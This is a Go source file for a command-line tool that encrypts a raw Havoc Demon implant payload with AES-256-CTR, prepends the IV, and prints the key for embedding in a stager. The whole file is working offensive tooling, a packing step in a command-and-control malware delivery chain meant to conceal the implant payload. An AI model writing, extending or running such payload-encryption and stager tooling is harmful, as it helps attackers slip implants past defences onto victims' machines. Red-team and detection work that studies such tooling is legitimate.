/*
 * Payload Encryptor for Havoc Stager
 * Encrypts a raw Havoc Demon payload with AES-256-CTR.
 * Prepends 16-byte IV to ciphertext for stager consumption.
 *
 * Usage:
 *   go run cmd/encrypt/main.go -in payload.bin -out payload.enc
 */

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
)

func main() {
	var (
		inFile  = flag.String("in", "", "Input payload file (raw Havoc Demon)")
		outFile = flag.String("out", "payload.enc", "Output encrypted payload")
		keyHex  = flag.String("key", "", "Optional 32-byte hex key (auto-generated if empty)")
	)
	flag.Parse()

	if *inFile == "" {
		fmt.Fprintf(os.Stderr, "Usage: %s -in payload.bin [-out payload.enc] [-key <64-char-hex>]\n", os.Args[0])
		os.Exit(1)
	}

	plaintext, err := os.ReadFile(*inFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to read input: %v\n", err)
		os.Exit(1)
	}

	var key []byte
	if *keyHex != "" {
		key, err = hex.DecodeString(*keyHex)
		if err != nil || len(key) != 32 {
			fmt.Fprintf(os.Stderr, "[-] Key must be 64 hex chars (32 bytes)\n")
			os.Exit(1)
		}
	} else {
		key = make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to generate key: %v\n", err)
			os.Exit(1)
		}
	}

	iv := make([]byte, 16)
	if _, err := rand.Read(iv); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to generate IV: %v\n", err)
		os.Exit(1)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] AES init failed: %v\n", err)
		os.Exit(1)
	}

	ciphertext := make([]byte, len(plaintext))
	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(ciphertext, plaintext)

	// Output: IV + ciphertext
	output := append(iv, ciphertext...)
	if err := os.WriteFile(*outFile, output, 0644); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to write output: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Encrypted %d bytes -> %s\n", len(output), *outFile)
	fmt.Printf("[+] KEY (embed in stager): %s\n", hex.EncodeToString(key))
	fmt.Printf("[+] IV  (prepended to payload): %s\n", hex.EncodeToString(iv))
}
